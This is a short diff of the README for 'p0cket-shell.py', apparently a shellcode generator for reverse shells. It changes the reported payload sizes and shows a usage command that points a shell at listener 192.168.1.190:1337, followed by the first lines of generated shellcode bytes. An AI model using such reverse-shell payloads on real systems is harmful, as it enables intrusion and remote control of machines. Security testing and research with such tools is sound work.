@@ -46,8 +46,8 @@ p0cket-shell.py --payload  [hardcode | resolve]
 ```
 p0cket-shell.py -p hardcode -lh 192.168.1.190 -lp 1337 -f python
 
-[*] Payload size: 278 bytes
-[*] Final size of python file: 1387 bytes
+[*] Payload size: 264 bytes
+[*] Final size of python file: 1309 bytes
 buf  = b""
 buf += b"\x65\x48\x8b\x04\x25\x60\x00\x00\x00\x48\x8b\x40"
 buf += b"\x18\x48\x8b\x40\x30\x48\x8b\x00\x48\x8b\x00\x48"
